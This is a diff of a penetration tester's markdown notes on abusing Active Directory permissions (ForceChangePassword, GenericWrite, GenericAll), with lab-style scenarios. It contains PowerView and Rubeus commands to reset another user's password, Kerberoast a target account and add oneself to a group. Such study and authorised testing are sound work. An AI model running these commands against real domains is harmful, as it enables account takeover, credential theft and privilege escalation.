@@ -61,11 +61,47 @@ bloodhound
 
 
 ## ForceChangePassword 
-
 gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
 
 
-### Scenario: Use the `wley` user to change the password for the `damundsen` user
+## GenericWrite
+
+**gives us the right to write to any non-protected attribute on an object.** 
+
+
+1) **Access over User account allows for:**
+    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
+2) **Access over Group allows for:**
+    - we could `add ourselves` or another `security principal` to a given group.
+3) **Access over Computer user allows for:**
+    - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
+
+
+
+
+## GenericAll 
+
+**full rights to the object**
+
+1) **Access over User account allows for:**
+   - Change the Target's Password
+   - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
+   - Shadow Credentials: Use this technique to impersonate a user 
+2) **Access over Group allows for:**
+   - we could `add ourselves` or another `security principal` to a given group.
+3) **Access over Computer user allows for:**
+   - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
+   - Shadow Credentials: Use this technique to impersonate a computer
+  
+
+
+# Examples
+
+## Change password 
+needed controls `GenericAll` or `ForceChangePassword`  
+
+### Scenario
+Use the `wley` user to change the password for the `damundsen` user
 
 
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `wley` using his password
@@ -83,20 +119,15 @@ using PowerView change the password
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
 
-## GenericWrite
-
-**gives us the right to write to any non-protected attribute on an object.** 
 
 
-1) **Access over User account allows for:**
-    - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
-2) **Access over Group allows for:**
-    - we could `add ourselves` or another `security principal` to a given group.
-3) **Access over Computer user allows for:**
-    - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
+## Targeted Kerberoasting
+needed controls `GenericAll` or `GenericWrite`  
+
+### Scenario 
+damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting
 
 
-### Scenario 1 : damundsen user have GenericWrite over adunn user so we can do Targeted Kerberoasting
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
 ```powershell
 $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
@@ -113,7 +144,12 @@ use `Rubeus` to catch the ticket also check this [kerberoasting](https://github.
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
 
-### Scenario 2 : damundsen user have GenericWrite over Help Desk Level 1 group so we can out selves 
+## Add Ourself to group 
+needed controls `GenericAll` or `GenericWrite`  
+
+
+### Scenario 
+damundsen user have GenericWrite over Help Desk Level 1 group so we can add our selves 
 
 
 create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0) for `damundsen` using his password
@@ -130,20 +166,3 @@ Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty
 # add your user
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred -Verbose
 ```
-
-
-
-
-## GenericAll 
-
-**full rights to the object**
-
-1) **Access over User account allows for:**
-   - Change the Target's Password
-   - Targeted Kerberoasting: we could `assign them an SPN` and perform a `Kerberoasting attack` (which relies on the target account having a weak password set).
-   - Shadow Credentials: Use this technique to impersonate a user 
-2) **Access over Group allows for:**
-   - we could `add ourselves` or another `security principal` to a given group.
-3) **Access over Computer user allows for:**
-   - we could perform a `Kerberos Resource-based Constrained Delegation` attack.
-   - Shadow Credentials: Use this technique to impersonate a computer    
